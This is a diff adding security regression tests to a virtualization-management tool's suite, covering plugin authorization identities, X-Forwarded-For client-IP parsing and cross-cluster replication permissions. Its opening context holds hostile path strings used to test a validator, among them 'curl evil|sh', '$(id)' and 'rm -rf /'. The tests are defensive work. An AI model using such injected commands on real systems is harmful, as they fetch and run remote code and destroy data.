@@ -205,3 +205,64 @@ def test_ha_heartbeat_path_accepts_normal_paths():
     for bad in ('/mnt/x"; curl evil|sh; #', '/mnt/$(id)', '/mnt/`id`', 'relative/path',
                 '/mnt/x\nrm -rf /'):
         assert not re.fullmatch(ok, bad), bad
+
+
+# ── plugins: the fix was applied to one handler and its siblings were missed ──
+def test_portal_handlers_build_a_floored_identity(api, seed):
+    """_ct_create_options used build_authz_user with a comment explaining why; five siblings in
+    the same file kept the raw load_users() lookup, so an admin-owned viewer token reached
+    user_can_access_vm with its owner's admin role."""
+    import re
+    src = open('plugins/client_portal/__init__.py').read()
+    # no handler may take its authz identity from a raw users-dict lookup any more
+    assert not re.search(r'^\s+user = users\.get\(username', src, re.M), \
+        "a portal handler still builds its identity from a raw load_users() record"
+
+
+def test_plugin_admin_checks_use_the_effective_role():
+    for p in ('plugins/status_page/__init__.py', 'plugins/notifications/__init__.py'):
+        src = open(p).read()
+        assert 'effective_role' in src, f"{p} still gates on the stored role"
+
+
+# ── X-Forwarded-For: the leftmost hop is whatever the client sent ────────────
+def test_client_ip_takes_the_rightmost_untrusted_hop(api):
+    from pegaprox.utils.audit import get_client_ip
+    import pegaprox.utils.audit as auditmod
+    with api.app.test_request_context(
+            '/', headers={'X-Forwarded-For': '1.2.3.4, 203.0.113.9'},
+            environ_base={'REMOTE_ADDR': '127.0.0.1'}):
+        # 127.0.0.1 is a trusted proxy, so the header is honoured — but the client-supplied
+        # leftmost entry must not win the bucket key
+        assert get_client_ip() == '203.0.113.9'
+
+
+def test_client_ip_single_entry_still_works(api):
+    from pegaprox.utils.audit import get_client_ip
+    with api.app.test_request_context(
+            '/', headers={'X-Forwarded-For': '203.0.113.9'},
+            environ_base={'REMOTE_ADDR': '127.0.0.1'}):
+        assert get_client_ip() == '203.0.113.9'
+
+
+def test_client_ip_ignores_the_header_from_an_untrusted_peer(api):
+    from pegaprox.utils.audit import get_client_ip
+    with api.app.test_request_context(
+            '/', headers={'X-Forwarded-For': '1.2.3.4'},
+            environ_base={'REMOTE_ADDR': '198.51.100.7'}):
+        assert get_client_ip() == '198.51.100.7'
+
+
+# ── cross-cluster replication clones a guest to another cluster ──────────────
+def test_cross_cluster_replication_gates_the_source_guest(api, seed):
+    seed.tenant('tenant_x', clusters=['cluster_1', 'cluster_2'])
+    u = seed.user('xrepl', role='viewer', tenant_id='tenant_x',
+                  permissions=['cluster.config', 'cluster.view'])
+    seed.pool('cluster_1', 'pool_1', 'xrepl', ['pool.view', 'vm.view'])
+    _pool_membership('cluster_1', {100: ('qemu', 'pool_1')})
+    _cluster(api, 'cluster_1')
+    _cluster(api, 'cluster_2')
+    r = api.as_user(u).post('/api/cross-cluster-replications',
+                            json={'source_cluster': 'cluster_1', 'target_cluster': 'cluster_2',
+                                  'vmid': 300, 'target_node': 'n1'})
+    assert r.status_code == 403, r.get_data(as_text=True)
